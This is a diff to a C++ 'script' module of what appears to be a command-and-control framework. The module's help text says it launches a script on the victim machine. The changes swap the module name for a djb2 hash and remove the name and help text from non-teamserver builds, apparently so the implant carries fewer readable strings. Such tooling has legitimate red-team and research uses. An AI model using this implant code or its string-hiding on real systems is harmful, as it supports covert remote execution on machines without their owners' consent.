@@ -3,10 +3,14 @@
 #include <cstring>
 #include <array>
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 
-const std::string moduleName = "script";
+constexpr std::string_view moduleName = "script";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -19,7 +23,11 @@ __declspec(dllexport) Script* ScriptConstructor()
 #endif
 
 Script::Script()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -30,11 +38,12 @@ Script::~Script()
 std::string Script::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "script:\n";
 	info += "Launch the script on the victim machine\n";
 	info += "exemple:\n";
 	info += " - script /tmp/toto.sh\n";
-
+#endif
 	return info;
 }
 
@@ -97,7 +106,7 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #endif
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_returnvalue(result);
 
 	return 0;
